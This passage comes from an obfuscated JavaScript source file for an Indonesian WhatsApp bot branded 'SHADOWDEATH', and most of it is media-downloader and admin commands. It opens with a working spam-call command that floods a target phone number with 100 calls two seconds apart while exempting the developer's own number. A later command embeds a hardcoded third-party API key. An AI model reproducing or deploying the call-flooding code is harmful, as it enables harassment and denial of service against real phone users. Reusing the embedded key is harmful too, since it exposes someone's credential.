                'text': '' + ("• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : " + ('.' + _0x4345b8) + " 628xxx"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            let _0x142f04 = _0x4e6f93 + "@s.whatsapp.net";
            if (_0x142f04 === "6283891457614@s.whatsapp.net") {
              _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "*Developernya seleb kocak, gabakal diangkat telp gw👺*",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            } else {
              await _0x47285b.sendMessage(_0x2f6673.chat, {
                'react': {
                  'text': '📲',
                  'key': _0x2f6673.key
                }
              });
              await sleep(0x5dc);
              await _0x47285b.sendMessage(_0x2f6673.chat, {
                'react': {
                  'text': '🎉',
                  'key': _0x2f6673.key
                }
              });
              _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("*Succes spam call to target " + _0x4e6f93 + '*'),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
              _0x47285b.sendMessage(_0x142f04, {
                'text': "halo mass"
              });
              for (let _0x11d2db = 0x0; _0x11d2db < 0x64; _0x11d2db++) {
                _0x14367e(_0x142f04);
                await sleep(0x7d0);
              }
              _0x47285b.sendMessage(_0x142f04, {
                'text': "halo mass"
              });
            }
          }
        }
        break;
      case 'clsesi':
      case "clearsession":
        {
          const _0x55bcf0 = fs.readdirSync("./session").filter(_0x42f006 => _0x42f006 !== 'creds.json');
          const _0x2c2e73 = fs.readdirSync("./library/database/sampah").filter(_0x25e1c3 => _0x25e1c3 !== 'A');
          for (const _0x159fd5 of _0x55bcf0) {
            await fs.unlinkSync('./session/' + _0x159fd5);
          }
          for (const _0x5c9189 of _0x2c2e73) {
            await fs.unlinkSync("./library/database/sampah/" + _0x5c9189);
          }
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': '' + ("*Berhasil membersihkan sampah ✅*\n*" + _0x55bcf0.length + "* sampah session\n*" + _0x2c2e73.length + "* sampah file"),
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "unblok":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + global.mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (_0x2f6673.isGroup && !_0x2f6673.quoted && !_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "@tag/nomornya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          const _0x5d83e4 = !_0x2f6673.isGroup ? _0x2f6673.chat : _0x2f6673.mentionedJid[0x0] ? _0x2f6673.mentionedJid[0x0] : _0x2f6673.quoted ? _0x2f6673.quoted.sender : _0x1aeaf2 ? _0x1aeaf2.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : '';
          await _0x47285b.updateBlockStatus(_0x5d83e4, "unblock");
          if (_0x2f6673.isGroup) {
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Berhasil membuka blokiran @" + _0x5d83e4.split('@')[0x0],
              'mentions': [_0x5d83e4]
            }, {
              'quoted': _0x2f6673
            });
          }
        }
        break;
      case "play":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "dj tiktok" + "\n");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🔎',
              'key': _0x2f6673.key
            }
          });
          let _0x4c0f9e = await yts(_0x1aeaf2);
          const _0x18a49d = await _0x4c0f9e.all[0x0];
          var _0x33a32c = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url=" + _0x18a49d.url);
          if (_0x33a32c.download.audio) {
            let _0x3671be = _0x33a32c.download.audio;
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'audio': {
                'url': _0x3671be
              },
              'mimetype': "audio/mpeg",
              'contextInfo': {
                'externalAdReply': {
                  'thumbnailUrl': _0x18a49d.thumbnail,
                  'title': _0x18a49d.title,
                  'body': "Author " + _0x18a49d.author.name + " || Duration " + _0x18a49d.timestamp,
                  'sourceUrl': _0x18a49d.url,
                  'renderLargerThumbnail': true,
                  'mediaType': 0x1
                }
              }
            }, {
              'quoted': _0x2f6673
            });
          } else {
            return _0x2f6673.reply("Error! vidio atau lagu tidak ditemukan");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '',
              'key': _0x2f6673.key
            }
          });
        }
        break;
      case 'playvid':
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "dj tiktok" + "\n");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🔎',
              'key': _0x2f6673.key
            }
          });
          let _0x513483 = await yts(_0x1aeaf2);
          const _0x1d2a4b = await _0x513483.all[0x0];
          var _0x33a32c = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url=" + _0x1d2a4b.url);
          if (_0x33a32c.download.video) {
            let _0x166e3e = _0x33a32c.download.video;
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'video': {
                'url': _0x166e3e
              },
              'ptv': true,
              'mimetype': "video/mp4"
            }, {
              'quoted': _0x2f6673
            });
          } else {
            return _0x2f6673.reply("Error! vidio atau lagu tidak ditemukan");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '',
              'key': _0x2f6673.key
            }
          });
        }
        break;
      case "yts":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "we dont talk" + "\n");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🔎',
              'key': _0x2f6673.key
            }
          });
          let _0x2ee26a = await yts(_0x1aeaf2);
          const _0x2a69e5 = _0x2ee26a.all;
          let _0x589f36 = "\n    *[ Result From Youtube Search 🔍 ]*\n\n";
          for (let _0x52f49c of _0x2a69e5) {
            _0x589f36 += "* *Title :* " + _0x52f49c.title + "\n* *Durasi :* " + _0x52f49c.timestamp + "\n* *Upload :* " + _0x52f49c.ago + "\n* *Views :* " + _0x52f49c.views + "\n* *Author :* " + (_0x52f49c?.["author"]?.['name'] || "Unknown") + "\n* *Source :* " + _0x52f49c.url + "\n\n";
          }
          await _0x2f6673.reply(_0x589f36);
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '',
              'key': _0x2f6673.key
            }
          });
        }
        break;
      case "ytmp3":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "linknya" + "\n");
          }
          if (!_0x1aeaf2.startsWith("https://")) {
            return _0x2f6673.reply("Link Tautan Tidak Valid");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🕖',
              'key': _0x2f6673.key
            }
          });
          var _0x33a32c = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url=" + _0x1aeaf2);
          if (_0x33a32c.download.audio) {
            let _0x375fcc = _0x33a32c.download.audio;
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'audio': {
                'url': _0x375fcc
              },
              'mimetype': "audio/mpeg"
            }, {
              'quoted': _0x2f6673
            });
          } else {
            return _0x2f6673.reply("Error! vidio atau lagu tidak ditemukan");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '',
              'key': _0x2f6673.key
            }
          });
        }
        break;
      case 'block':
      case "blok":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': global.mess.owner,
              'mentions': [_0x2f6673.sender],
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': "© Powered By " + namaOwner,
                  'thumbnailUrl': global.image.reply,
                  'sourceUrl': null
                }
              }
            }, {
              'quoted': _0x390426
            });
          }
          if (_0x2f6673.isGroup && !_0x2f6673.quoted && !_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "@tag/nomornya" + "\n");
          }
          const _0x46163d = !_0x2f6673.isGroup ? _0x2f6673.chat : _0x2f6673.mentionedJid[0x0] ? _0x2f6673.mentionedJid[0x0] : _0x2f6673.quoted ? _0x2f6673.quoted.sender : _0x1aeaf2 ? _0x1aeaf2.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : '';
          await _0x47285b.updateBlockStatus(_0x46163d, "block");
          if (_0x2f6673.isGroup) {
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Berhasil memblokir @" + _0x46163d.split('@')[0x0],
              'mentions': [_0x46163d]
            }, {
              'quoted': _0x2f6673
            });
          }
        }
        break;
      case "ytmp4":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "linknya" + "\n");
          }
          if (!_0x1aeaf2.startsWith('https://')) {
            return _0x2f6673.reply("Link Tautan Tidak Valid");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🕖',
              'key': _0x2f6673.key
            }
          });
          var _0x33a32c = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url=" + _0x1aeaf2);
          if (_0x33a32c.download.video) {
            let _0x2a5ad1 = _0x33a32c.download.video;
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'video': {
                'url': _0x2a5ad1
              },
              'mimetype': "video/mp4"
            }, {
              'quoted': _0x2f6673
            });
          } else {
            return _0x2f6673.reply("Error! vidio atau lagu tidak ditemukan");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '',
              'key': _0x2f6673.key
            }
          });
        }
        break;
      case 'mediafire':
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "linknya" + "\n");
          }
          if (!_0x1aeaf2.includes("mediafire.com")) {
            return _0x2f6673.reply("Link tautan tidak valid");
          }
          await mediafire(_0x1aeaf2).then(async _0x36fa89 => {
            if (!_0x36fa89.link) {
              return _0x2f6673.reply("Error! Result Not Found");
            }
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'document': {
                'url': _0x36fa89.link
              },
              'fileName': _0x36fa89.judul,
              'mimetype': "application/" + _0x36fa89.mime.toLowerCase()
            }, {
              'quoted': _0x2f6673
            });
          })["catch"](_0x5ccb66 => _0x2f6673.reply("Error"));
        }
        break;
      case 'tiktokmp3':
      case "ttmp3":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "linknya" + "\n");
          }
          if (!_0x1aeaf2.startsWith("https://")) {
            return _0x2f6673.reply("Link tautan tidak valid");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🕖',
              'key': _0x2f6673.key
            }
          });
          await tiktokDl(_0x1aeaf2).then(async _0x3c0870 => {
            if (!_0x3c0870.status) {
              return _0x2f6673.reply("Error! Result Not Found");
            }
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'audio': {
                'url': _0x3c0870.music_info.url
              },
              'mimetype': "audio/mpeg"
            }, {
              'quoted': _0x2f6673
            });
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'react': {
                'text': '',
                'key': _0x2f6673.key
              }
            });
          })["catch"](_0x2c00c3 => _0x2f6673.reply("Error"));
        }
        break;
      case "apkmod":
        {
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + 'capcut' + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🕖',
              'key': _0x2f6673.key
            }
          });
          await fetchJson("https://api.skyzopedia.us.kg/api/search/happymod?q=" + _0x1aeaf2).then(_0x116763 => {
            let _0x506da7 = '';
            for (let _0x59c3ff of _0x116763.result) {
              _0x506da7 += "\n* *Nama Apk :* " + _0x59c3ff.name + "\n* *Link Download:* " + _0x59c3ff.link + "\n";
            }
            _0x2f6673.reply(_0x506da7);
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'react': {
                'text': '',
                'key': _0x2f6673.key
              }
            });
          })["catch"](_0x4f8cbe => _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Gagal",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          }));
        }
        break;
      case "instagram":
      case "igdl":
      case 'ig':
        {
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "linknya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2.startsWith("https://")) {
            return _0x2f6673.reply("Link tautan tidak valid");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🕖',
              'key': _0x2f6673.key
            }
          });
          await fetchJson("https://api.skyzopedia.us.kg/api/download/igdl?url=" + _0x1aeaf2).then(async _0x2ab277 => {
            if (!_0x2ab277.status) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Error! Result Not Found",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'video': {
                'url': _0x2ab277.result.url
              },
              'mimetype': "video/mp4",
              'caption': "*video Instagram berhasil ke download ✅ ✅*"
            }, {
              'quoted': _0x2f6673
            });
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'react': {
                'text': '',
                'key': _0x2f6673.key
              }
            });
          })["catch"](_0x3f87a7 => _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Gagal",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          }));
        }
        break;
      case 'facebook':
      case 'fb':
      case 'fbdl':
        {
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "linknya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2.startsWith("https://")) {
            return _0x2f6673.reply("Link tautan tidak valid");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🕖',
              'key': _0x2f6673.key
            }
          });
          await fetchJson("https://api.skyzopedia.us.kg/api/download/fbdl?url=" + _0x1aeaf2).then(async _0x312a86 => {
            if (!_0x312a86.status) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Error! Result Not Found",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'video': {
                'url': _0x312a86.result.sd
              },
              'mimetype': 'video/mp4',
              'caption': "*video Facebook berhasil ke download ✅ ✅*"
            }, {
              'quoted': _0x2f6673
            });
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'react': {
                'text': '',
                'key': _0x2f6673.key
              }
            });
          })["catch"](_0x4c4830 => _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Error",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          }));
        }
        break;
      case "capcut":
        {
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "linknya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2.startsWith("https://")) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Link tautan tidak valid",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🕖',
              'key': _0x2f6673.key
            }
          });
          await fetchJson("https://api.skyzopedia.us.kg/api/download/capcut?url=" + _0x1aeaf2).then(async _0x138fb8 => {
            if (!_0x138fb8.status) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Error! Result Not Found",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'video': {
                'url': _0x138fb8.result.video
              },
              'mimetype': "video/mp4",
              'caption': "*Sukses*"
            }, {
              'quoted': _0x2f6673
            });
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'react': {
                'text': '',
                'key': _0x2f6673.key
              }
            });
          })["catch"](_0x380313 => _0x2f6673.reply("Error"));
        }
        break;
      case "gitclone":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "https://github.com/Depay/Nika" + "\n");
          }
          let _0x298815 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
          if (!_0x298815.test(_0x1aeaf2)) {
            return _0x2f6673.reply("Link tautan tidak valid");
          }
          try {
            let [, _0x40a916, _0x40a27d] = _0x3e49e9[0x0].match(_0x298815) || [];
            _0x40a27d = _0x40a27d.replace(/.git$/, '');
            let _0x500075 = "https://api.github.com/repos/" + _0x40a916 + '/' + _0x40a27d + "/zipball";
            let _0x16596b = (await fetch(_0x500075, {
              'method': 'HEAD'
            })).headers.get("content-disposition").match(/attachment; filename=(.*)/)[0x1];
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'document': {
                'url': _0x500075
              },
              'mimetype': "application/zip",
              'fileName': '' + _0x16596b
            }, {
              'quoted': _0x2f6673
            });
          } catch (_0x101373) {
            await _0x2f6673.reply("Error! repositori tidak ditemukan");
          }
        }
        break;
      case 'tt':
      case "tiktok":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "url" + "\n");
          }
          if (!_0x1aeaf2.startsWith("https://")) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "url" + "\n");
          }
          await tiktokDl(q).then(async _0x4c34c1 => {
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'react': {
                'text': '🕖',
                'key': _0x2f6673.key
              }
            });
            if (!_0x4c34c1.status) {
              return _0x2f6673.reply('Error');
            }
            if (_0x4c34c1.durations == 0x0 && _0x4c34c1.duration == "0 Seconds") {
              let _0x3fe935 = new Array();
              let _0x52311d = 0x0;
              for (let _0x4dbdb9 of _0x4c34c1.data) {
                let _0x7a7a3c = await prepareWAMessageMedia({
                  'image': {
                    'url': '' + _0x4dbdb9.url
                  }
                }, {
                  'upload': _0x47285b.waUploadToServer
                });
                await _0x3fe935.push({
                  'header': proto.Message.InteractiveMessage.Header.fromObject({
                    'title': "Foto Slide Ke *" + (_0x52311d += 0x1) + '*',
                    'hasMediaAttachment': true,
                    ..._0x7a7a3c
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    'buttons': [{
                      'name': 'cta_url',
                      'buttonParamsJson': "{\"display_text\":\"Link Tautan Foto\",\"url\":\"" + _0x4dbdb9.url + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                });
              }
              const _0x5019ed = await generateWAMessageFromContent(_0x2f6673.chat, {
                'viewOnceMessageV2Extension': {
                  'message': {
                    'messageContextInfo': {
                      'deviceListMetadata': {},
                      'deviceListMetadataVersion': 0x2
                    },
                    'interactiveMessage': proto.Message.InteractiveMessage.fromObject({
                      'body': proto.Message.InteractiveMessage.Body.fromObject({
                        'text': "*Sukses*"
                      }),
                      'carouselMessage': proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        'cards': _0x3fe935
                      })
                    })
                  }
                }
              }, {
                'userJid': _0x2f6673.sender,
                'quoted': _0x2f6673
              });
              await _0x47285b.relayMessage(_0x2f6673.chat, _0x5019ed.message, {
                'messageId': _0x5019ed.key.id
              });
            } else {
              let _0x159b37 = await _0x4c34c1.data.find(_0x109464 => _0x109464.type == "nowatermark_hd" || _0x109464.type == "nowatermark");
              await _0x47285b.sendMessage(_0x2f6673.chat, {
                'video': {
                  'url': _0x159b37.url
                },
                'mimetype': "video/mp4",
                'caption': "*Sukses*"
              }, {
                'quoted': _0x2f6673
              });
            }
          })["catch"](_0x4bb453 => console.log(_0x4bb453));
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '',
              'key': _0x2f6673.key
            }
          });
        }
        break;
      case "ssweb":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "https://example.com" + "\n");
          }
          if (!isUrl(_0x1aeaf2)) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + 'https://example.com' + "\n");
          }
          const {
            screenshotV1: _0x2e4496,
            screenshotV2: _0x50d7e5,
            screenshotV3: _0x4463b1
          } = require("getscreenshot.js");
          var _0x4de753 = await _0x50d7e5(_0x1aeaf2);
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'image': _0x4de753,
            'mimetype': "image/png"
          }, {
            'quoted': _0x2f6673
          });
        }
        break;
      case "shortlink":
      case "shorturl":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "https://example.com" + "\n");
          }
          if (!isUrl(_0x1aeaf2)) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "https://example.com" + "\n");
          }
          var _0x4a61b8 = await axios.get('https://tinyurl.com/api-create.php?url=' + encodeURIComponent(_0x1aeaf2));
          var _0x541590 = "\n* *Shortlink by tinyurl.com*\n" + _0x4a61b8.data.toString() + "\n";
          return _0x2f6673.reply(_0x541590);
        }
        break;
      case 'shortlink-dl':
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "https://example.com" + "\n");
          }
          if (!isUrl(_0x1aeaf2)) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "https://example.com" + "\n");
          }
          var _0x1d45d8 = await fetch("https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=" + _0x1aeaf2);
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x1d45d8.url
          }, {
            'quoted': _0x2f6673
          });
        }
        break;
      case "idgc":
      case "cekidgc":
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': mess.group,
              'mentions': [_0x2f6673.sender],
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': "© Powered By " + namaOwner,
                  'thumbnailUrl': global.image.reply,
                  'sourceUrl': null
                }
              }
            }, {
              'quoted': _0x390426
            });
          }
          _0x2f6673.reply(_0x2f6673.chat);
        }
        break;
      case 'listgc':
      case "listgrup":
        {
          if (!_0x429a13) {
            return;
          }
          let _0x58e9ed = "\n *List all group chat*\n";
          let _0x51df35 = await _0x47285b.groupFetchAllParticipating();
          let _0x144f86 = Object.values(_0x51df35);
          _0x58e9ed += "\n* *Total group :* " + _0x144f86.length + "\n";
          for (const _0x188249 of _0x144f86) {
